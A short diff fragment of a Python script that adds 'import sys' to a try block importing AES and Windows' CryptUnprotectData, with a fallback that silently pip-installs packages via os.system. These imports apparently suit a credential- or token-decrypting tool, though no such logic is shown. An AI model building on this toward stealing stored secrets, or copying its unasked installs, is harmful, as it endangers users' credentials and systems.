@@ -11,6 +11,7 @@ try:
     from Crypto.Cipher import AES
     from win32crypt import CryptUnprotectData
     import json
+    import sys
 except:
     for lib in ['tls-client', 'typing-extensions', 'colorama', 'pycryptodome', 'pypiwin32', 'requests']:
         os.system(f'pip install {lib}')
